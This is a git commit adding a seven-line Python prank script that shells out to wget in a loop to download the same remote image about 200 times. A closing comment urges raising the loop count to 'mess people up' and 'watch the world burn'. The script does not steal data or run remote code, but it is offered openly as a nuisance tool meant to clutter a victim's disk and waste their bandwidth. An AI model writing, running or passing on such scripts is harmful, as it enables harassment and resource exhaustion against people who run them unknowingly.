d8fc386f471aae888e54f830aa5879bb53d95f4d
stayfrostydoggo <110047100+stayfrostydoggo@users.noreply.github.com>
2022-07-26 09:33:46 -0700

    Create cheemsisgod.py

---
+++ cheemsisgod.py
@@ -0,0 +1,7 @@
+import os
+
+x = 1
+while x < 200:
+  os.system("wget https://play-lh.googleusercontent.com/xlnwmXFvzc9Avfl1ppJVURc7f3WynHvlA749D1lPjT-_bxycZIj3mODkNV_GfIKOYJmG")
+  x += 1
+#If you really wanna mess people up just up that number from 200 and watch the world burn
